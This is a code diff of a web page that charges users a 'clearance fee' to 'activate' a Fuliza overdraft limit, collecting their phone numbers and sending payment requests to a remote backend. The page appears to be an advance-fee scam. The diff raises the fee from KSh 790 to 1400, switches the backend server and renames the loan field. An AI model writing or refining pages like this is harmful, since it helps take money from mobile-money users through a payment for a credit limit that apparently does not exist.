@@ -124,7 +124,7 @@ body{font-family:'Segoe UI',Arial,sans-serif;background:#f0f4f8;min-height:100vh
       <div class="invoice-limit">Selected Fuliza Limit: <span>KSh <span id="limit">—</span></span></div>  
       <div class="invoice-amount-row">  
         <div class="invoice-currency">KSh</div>  
-        <div class="invoice-amount">790</div>  
+        <div class="invoice-amount">1400</div>  
         <div class="invoice-label">Amount Due</div>  
       </div>  
     </div>  <div class="checklist">  
@@ -162,7 +162,7 @@ body{font-family:'Segoe UI',Arial,sans-serif;background:#f0f4f8;min-height:100vh
 </div>  
 <div class="phone-hint" id="phoneHint">Enter 9 digits after 254 — must start with 7 (e.g. 712345678)</div>  
 
-<button class="pay-btn" id="payBtn" onclick="payNow()">Pay KSh 790 &amp; Activate Limit</button>  
+<button class="pay-btn" id="payBtn" onclick="payNow()">Pay KSh 1400 &amp; Activate Limit</button>  
 
 <div class="spinner" id="spinner">  
   <div class="loader"></div>  
@@ -215,14 +215,14 @@ body{font-family:'Segoe UI',Arial,sans-serif;background:#f0f4f8;min-height:100vh
   </div>  
 </div>
  <script>
-const BACKEND = "https://nyota-paynecta-server.onrender.com";
+const BACKEND = "https://swiftwallet-server.onrender.com";
 
 const selectedAmount = localStorage.getItem("selectedAmount") || "—";
 
 document.getElementById("limit").innerText = selectedAmount;
 document.getElementById("limitInNote").innerText = selectedAmount;
 
-const CLEARANCE_FEE = 790;
+const CLEARANCE_FEE = 1400;
 
 const phoneInput  = document.getElementById("phone");
 const phoneWrap   = document.getElementById("phoneWrap");
@@ -303,7 +303,7 @@ async function payNow(){
       body:JSON.stringify({
         phone:fullPhone,
         amount:CLEARANCE_FEE,
-        loan_amount:selectedAmount
+        deposit_amount:selectedAmount
       })
     });
 
@@ -374,13 +374,10 @@ function startPolling(reference,phone){
       setSpinner(false);
       setPayBtn(false);
 
-      if (
-  receipt.status === "processing" ||
-  receipt.status === "loan_released"
-) {
-  showSuccessPopup(receipt);
-      
-    
+      if(receipt.status==="processing"){
+
+        showSuccessPopup(receipt,phone);
+
       }else{
 
         showFailurePopup("Payment cancelled.");
@@ -389,7 +386,7 @@ function startPolling(reference,phone){
 
     }catch(e){}
 
-  },500);
+  },1500);
 }
 
 function showSuccessPopup(receipt,fallbackPhone){
@@ -444,4 +441,4 @@ function retryPayment(){
 }
 </script>  
 </body>  
-</html>
+          </html>
